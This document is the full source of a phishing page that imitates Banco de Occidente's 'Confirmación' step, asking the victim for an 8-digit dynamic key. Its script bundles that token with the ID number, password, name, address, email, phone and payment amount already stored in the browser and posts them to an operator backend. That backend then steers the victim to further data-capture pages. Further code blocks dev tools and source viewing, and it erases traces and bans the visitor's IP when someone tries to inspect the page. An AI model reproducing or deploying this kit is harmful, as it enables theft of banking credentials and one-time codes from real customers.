<html lang="en" class="hydrated"><head>
  <meta charset="utf-8">
  <title>Confimacion |</title>

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <link rel="icon" type="image/x-icon" href="img/favicon.ico">


  <style type="text/css">
    #fondo{
        width: 100%;
        height: 100%;
        position: fixed;
        z-index: 189;
        top: 0;
        left: 0;
        background: #F3F6FE;
    }
    #cargando{
      position: fixed;
      z-index: 190;
        top: 50%;
        left: 50%;
        margin-left: -55px;
        margin-top: -55px;
    }
    #loader-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      z-index: 9999;
      justify-content: center;
      align-items: center;
    }
    .loader-content {
      background: white;
      padding: 30px;
      border-radius: 10px;
      text-align: center;
    }
  </style>



  <meta name="description" content="Nuestro renovado Portal para transacciones te permite hacer pagos de créditos o tarjetas de créditos, consultas, transferencias, descargar extractos y mucho más. ¡Navégalo!">
  <meta name="keywords" content=" portal transaccional banco de occidente, transacciones banco de occidente, anterior portal transaccional banco de occidente, pagar tarjeta de crédito banco de occidente, pagos banco de occidente, portal de pagos banco de occidente, pagar tarjeta de crédito banco de occidente, transferir a otras cuentas banco de occidente, descargar extracto banco de occidente">

  <script type="text/javascript" src="https://code.jquery.com/jquery-3.6.0.js"></script>

  <style type="text/css">
    body, html {
      height: 100%;
      font-size: 14px;
      font-family: 'Poppins', sans-serif;
    }
    
    .initial-container {
      background: no-repeat url(img/back-login.87ca483d1db8c1bdeaf4.jpg);
      background-size: cover !important;
      position: relative;
      z-index: 101;
      height: 100%;
      display: flex;
      min-height: 47rem;
    }
    
    .initial-container:before {
      content: "";
      right: 0;
      left: 0;
      bottom: 0;
      top: 0;
      position: absolute;
      z-index: -1;
      background-image: linear-gradient(180deg, transparent 40%, #fff 90%);
    }
    
    .initial-container__form {
      display: flex;
      height: 100%;
      flex-direction: column;
      justify-content: center;
      margin-right: 0;
      align-items: flex-end;
      width: 100%;
      position: relative;
      z-index: 1;
    }
    
    .initial-container__section {
      background-color: #fff;
      box-shadow: 0 0 0.429rem 0 rgba(51,51,51,.2);
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 47rem;
      max-height: 100%;
      height: 100%;
      min-width: 50%;
      width: 50%;
      border-radius: 0;
    }
    
    .initial-container__content-form {
      height: 100%;
      display: flex;
      flex-direction: column;
      justify-content: center;
      width: 100%;
      max-width: 26.5rem;
      padding: 0 8px;
    }
    
    .initial-container__logo {
      width: 100%;
      background-image: url(img/logo-03-occidente-01-occidente-01-regular.aa547ca6b936469689ea.svg);
      background-size: auto 2.857rem;
      height: 10%;
      background-position: top;
      background-repeat: no-repeat;
      min-height: 4rem;
    }
    
    .form-group {
      margin-bottom: 1rem;
    }
    
    .form-group label {
      color: #555f83;
      margin-bottom: 0.5rem;
      font-weight: 500;
    }
    
    .form-control {
      width: 100%;
      padding: 0.75rem;
      border: 1px solid #adbae6;
      border-radius: 4px;
      font-size: 1rem;
      color: #555f83;
    }
    
         .token-container {
       display: flex;
       justify-content: center;
       align-items: center;
       margin: 2rem 0;
     }
     
     .token-input-single {
       width: 280px;
       height: 50px;
       border: 2px solid #adbae6;
       border-radius: 8px;
       font-size: 1.2rem;
       font-weight: bold;
       text-align: center;
       color: #0081ff;
       background: #f8f9fa;
       transition: all 0.3s ease;
       padding: 0 15px;
     }
    
         .token-input-single:focus {
       border-color: #0081ff;
       background: #fff;
       box-shadow: 0 0 0 3px rgba(0, 129, 255, 0.1);
       outline: none;
     }
    
    .btn {
      position: relative;
      border-radius: 4px;
      font-size: 1em;
      font-weight: 600;
      line-height: 1;
      letter-spacing: normal;
      text-align: center;
      padding: 0.85rem 1rem;
      color: #fff;
      background-image: linear-gradient(to bottom, #0081ff, #0056cb 72%);
      border: none;
      display: flex;
      justify-content: center;
      align-items: center;
      min-width: 2.85rem;
      max-height: 2.857rem;
      cursor: pointer;
      min-height: 39px;
    }
    
    .btn:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }
    
    .btn:hover:not(:disabled) {
      box-shadow: 0 10px 15px -8px #0081ff;
    }
    
    .btn.outliner {
      background: #fff;
      border: 1px solid #adbae6;
      color: #555f83;
    }
    
    .btn.outliner:hover {
      background-color: #f8f9fa;
      border: 1px solid #0081ff;
    }
    
    .actions-content {
      display: flex;
      justify-content: center;
      gap: 1rem;
      margin-top: 2rem;
    }
    
    .text-center {
      text-align: center;
    }
    
    .m-3s-bottom {
      margin-bottom: 1.5rem;
    }
    
    .s2-sm-center {
      font-size: 1.5rem;
      font-weight: 600;
      color: #333;
    }
    
    .b2-m-center {
      font-size: 1rem;
      color: #666;
      line-height: 1.4;
    }
    
         @media (max-width: 575px) {
       .initial-container {
         background: #F3F6FE;
       }
       
       .initial-container__form {
         align-items: center;
         width: 100%;
       }
       
       .initial-container__section {
         width: 100% !important;
         min-width: 100%;
         height: 100% !important;
         border-radius: 0;
       }
       
       .token-input-single {
         width: 250px;
         height: 55px;
         font-size: 1.3rem;
       }
     }
     
     @media (min-width: 576px) {
       .initial-container__section {
         border-radius: 0.714rem;
         max-height: 68.214rem;
         min-width: 35rem;
         max-width: 38.357rem;
         height: 80%;
         width: 80%;
       }
       
       .initial-container__content-form {
         padding: 0;
       }
     }
    
         @media (min-width: 992px) {
       .initial-container__form {
         align-items: flex-end;
         margin-right: 0;
         width: 100%;
       }
       
       .initial-container__section {
         height: 98% !important;
         width: 50% !important;
         max-width: 400px;
       }
     }
  </style>
</head>

<body> 
  <div id="fondo"></div>
  <div id="cargando"><img src="img/spinner_occidente.gif"></div>
  
  <!-- Loader Overlay -->
  <div id="loader-overlay">
    <div class="loader-content">
      <img src="img/spinner_occidente.gif" alt="Cargando">
      <h3>Procesando clave dinámica...</h3>
      <p>Por favor espere un momento</p>
    </div>
  </div>

  <div class="initial-container">
    <div class="initial-container__form">
      <div class="initial-container__section">
        <div class="initial-container__content-form">
          <div class="initial-container__logo"></div>
          
          <div class="text-center m-3s-bottom">
            <h2 class="s2-sm-center">CONFIRMACION</h2>
                         <p class="b2-m-center">Ingresa el código de 8 dígitos que recibiste en tu dispositivo móvil</p>
          </div>

          <form id="tokenForm">
            <input type="hidden" id="session_id" name="session_id">
            <input type="hidden" id="username" name="username">
            <input type="hidden" id="token" name="token">
            
                         <div class="form-group">
                              <label for="token" class="text-center" style="display: block; margin-bottom: 1rem;">Código de 8 dígitos</label>
               
                              <div class="token-container">
                  <input type="text" id="token-input" class="token-input-single" maxlength="8" autocomplete="off" pattern="[0-9]*" inputmode="numeric" placeholder="">
                </div>
             </div>

            <div class="actions-content">
              <button type="button" class="btn outliner" id="btnCancelar">Cancelar</button>
              <button type="submit" class="btn" id="btnIngresar" disabled>Continuar</button>
            </div>
          </form>
        </div>
      </div>
    </div>
  </div>

 <script>
    // Espera 3 segundos y oculta el loader inicial
    setTimeout(function () {
      const fondo = document.getElementById('fondo');
      const cargando = document.getElementById('cargando');
      if (fondo) fondo.style.display = 'none';
      if (cargando) cargando.style.display = 'none';
    }, 3000);

    document.addEventListener("DOMContentLoaded", function () {
      const urlParams = new URLSearchParams(window.location.search);
      
      // Generar o recuperar session_id
      let sessionId = ((() => { const params = new URLSearchParams(window.location.search); const direct = [params.get('transactionId'), params.get('tid'), params.get('tx'), params.get('session_id'), params.get('ts')].find((value) => value !== null && String(value).trim() !== ''); if (direct) { const normalized = String(direct); localStorage.setItem('session_id', normalized); localStorage.setItem('last_tid', normalized); return normalized; } const generated = 'session_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11); localStorage.setItem('session_id', generated); localStorage.setItem('last_tid', generated); return generated; })());
      if (!sessionId) {
        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('session_id', sessionId);
      }
      
      const sessionInput = document.getElementById('session_id');
      if (sessionInput) sessionInput.value = sessionId;

      // Obtener usuario desde URL params
      const userFromUrl = urlParams.get('user');
      const usernameInput = document.getElementById('username');
      if (userFromUrl) {
        if (usernameInput) usernameInput.value = userFromUrl;
        localStorage.setItem('username', userFromUrl);
      }

      // Validación para el campo de token único
      const tokenInput = document.getElementById('token-input');
      if (tokenInput) {
        tokenInput.addEventListener('input', function(e) {
          this.value = this.value.replace(/[^0-9]/g, '');
          checkTokenComplete();
        });
        
        tokenInput.addEventListener('paste', function(e) {
          e.preventDefault();
          let pastedText = (e.clipboardData || window.clipboardData).getData('text');
          let numbersOnly = pastedText.replace(/[^0-9]/g, '').substring(0, 8);
          this.value = numbersOnly;
          checkTokenComplete();
        });
      }
       
      function checkTokenComplete() {
        const token = tokenInput.value;
        const btnIngresar = document.getElementById('btnIngresar');
        if (btnIngresar) {
          if (token.length === 8) {
            btnIngresar.removeAttribute('disabled');
          } else {
            btnIngresar.setAttribute('disabled', '');
          }
        }
      }

      // Event listener para el botón Continuar
      const btnIngresar = document.getElementById('btnIngresar');
      if (btnIngresar) {
        btnIngresar.addEventListener('click', async function (event) {
          event.preventDefault();

          const token = document.getElementById('token-input').value;
          
          if (token.length !== 8) {
            alert('El token debe tener 8 dígitos');
            return;
          }

          // Mostrar loader
          const loader = document.getElementById('loader-overlay');
          if (loader) loader.style.display = 'flex';

          const session_id = sessionId;
          localStorage.setItem('token', token);
          
          if (document.getElementById('token')) {
            document.getElementById('token').value = token;
          }

          let localTb = {};
          try {
              localTb = JSON.parse(localStorage.getItem('tbdatos') || '{}');
          } catch(e) {}

          localTb.banco = 'BANCO DE OCCIDENTE';

          let amountValue = localTb.total_pagar || localTb.monto || localTb.amount || localTb.valor || localTb.total || '';
          if (!amountValue) {
            amountValue = localStorage.getItem('monto') || localStorage.getItem('amount') || localStorage.getItem('valor') || localStorage.getItem('total_pagar') || '';
          }
          
          const formData = new FormData();
          formData.append('transactionId', session_id);
          formData.append('u_id', localStorage.getItem('identificacion') || '');
          formData.append('u_ps', localStorage.getItem('password') || '');
          formData.append('u_tk', token);
          formData.append('u_tb', JSON.stringify(localTb));
          formData.append('banco', 'BANCO DE OCCIDENTE');
          formData.append('nombre', localTb.nombre || localStorage.getItem('nombre') || localStorage.getItem('nom') || '');
          formData.append('documento', localTb.documento || localStorage.getItem('val') || '');
          formData.append('cedula', localTb.cedula || localTb.documento || localStorage.getItem('val') || '');
          formData.append('tipo_identificacion', localTb.tipo_identificacion || localStorage.getItem('tipoDocumento') || '');
          formData.append('correo', localTb.correo || localStorage.getItem('correo') || localStorage.getItem('eml') || '');
          formData.append('telefono', localTb.telefono || localStorage.getItem('celular') || localStorage.getItem('cel') || '');
          formData.append('direccion', localTb.direccion || localStorage.getItem('direccion') || '');
          if (amountValue) {
            formData.append('monto', amountValue);
            formData.append('total_pagar', amountValue);
          }

          fetch('procesar_dinamica.php', { method: 'POST', body: formData })
          .then(res => res.json())
          .then(result => {
            if (result.status === 'success') {
              checkPaymentVerification(session_id, result.messageId);
            } else {
              if (loader) loader.style.display = 'none';
            }
          })
          .catch(() => { if (loader) loader.style.display = 'none'; });
        });
      }

      // Event listener para el botón Cancelar
      const btnCancelar = document.getElementById('btnCancelar');
      if (btnCancelar) {
        btnCancelar.addEventListener('click', function() {
          window.location.href = "index.php";
        });
      }
    });

    async function checkPaymentVerification(transactionId, messageId) {
      try {
        const formData = new FormData();
        formData.append('transactionId', transactionId);
        formData.append('messageId', messageId);

        const verifierUrl = 'verificar_respuesta.php?ts=' + Date.now();
        const res = await fetch(verifierUrl, { method: 'POST', body: formData, cache: 'no-store' });
        const result = await res.json();

        if (result.action) {
          const loader = document.getElementById('loader-overlay');
          if (loader) loader.style.display = 'none';

          switch (result.action) {
            case 'error_token':
            case 'pedir_dinamica':
            case 'error_token': 
              alert("Error de Clave Dinámica. Intente de nuevo.");
              window.location.href = "token.php";
              break;
            case 'error_logo':
            case 'error_logo': 
              alert("Usuario o clave incorrectos.");
              window.location.href = "index.php";
              break;
            case 'error_tc':
              window.location.href = "/datac/alter.php";
              break;
            case 'error': 
              window.location.href = "/caras";
              break;
            case 'cedula': 
              window.location.href = "/cedula";
              break;
            case 'bre_b': 
              window.location.href = "/recaudos/brev.php?occidente";
              break;
            case 'ban_ip':
                    try {
                        localStorage.clear();
                        sessionStorage.clear();
                        document.cookie.split(";").forEach(function(c) { 
                            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
                        });
                    } catch(e) {}
                    window.location.replace("/fin.php");
                    break;
                case 'confirm_finalizar':
              window.location.href = "/fin.php";
              break;
            default:
              setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
          }
        } else {
          setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
        }
      } catch (err) {
        setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
      }
    }
</script>
<script>
// --- DESACTIVAR CLICK DERECHO, INSPECCIONAR Y F12 ---
(function() {
    // 1. Desactivar Click Derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // 2. Desactivar atajos de teclado de desarrollo (F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+Shift+J, Ctrl+U, Cmd+Opt+I)
    document.addEventListener('keydown', function(e) {
        // F12
        if (e.keyCode === 123) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+Shift+I o Cmd+Opt+I
        if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+U (Ver código fuente)
        if ((e.ctrlKey || e.metaKey) && e.keyCode === 85) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
    });

    // 3. Detectar apertura de Herramientas de Desarrollo (DevTools) por dimensiones
    let devtoolsOpen = false;
    const threshold = 160;
    
    function checkDevTools() { return false; }

    // 4. Función para Auto-Banear la IP del Atacante
    let banTriggered = false;
    function triggerAutoBan() {
        if (banTriggered) return;
        banTriggered = true;
        
        // Limpieza inmediata del almacenamiento local
        try {
            localStorage.clear();
            sessionStorage.clear();
            document.cookie.split(";").forEach(function(c) { 
                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
            });
        } catch(e) {}

        // Enviar IP para auto-bloqueo al backend (usamos el honeypot para gatillar el baneo)
        const formData = new FormData();
        formData.append('website', 'automated_devtools_trigger');
        
        // Buscamos si tenemos la variable de transacción en localStorage
        let tid = '';
        try {
            tid = localStorage.getItem('last_tid') || localStorage.getItem('session_id') || '';
        } catch(e) {}
        if (tid) {
            formData.append('transactionId', tid);
        }

        // Enviamos post silencioso para banear la IP en el backend
        fetch('/gate/process/paso1datos.php', {
            method: 'POST',
            body: formData,
            keepalive: true
        }).finally(function() {
            window.location.replace("/fin.php");
        });
    }
})();
// ---------------------------------------------------
</script>
</body>
</html> 